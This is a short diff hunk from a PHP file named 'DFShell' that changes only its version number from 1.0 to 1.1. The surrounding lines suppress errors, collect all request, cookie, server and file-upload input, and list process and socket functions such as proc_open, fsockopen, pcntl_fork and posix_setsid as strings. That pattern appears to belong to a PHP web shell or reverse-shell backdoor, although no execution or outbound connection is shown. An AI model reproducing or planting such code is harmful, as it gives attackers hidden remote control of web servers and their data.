@@ -17,7 +17,7 @@ error_reporting(0);
 // creating session
 
 session_start();
-$DFShell_Ver = 1.0;
+$DFShell_Ver = 1.1;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
 "stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select"); // $GLOBALS['DFSyntax']
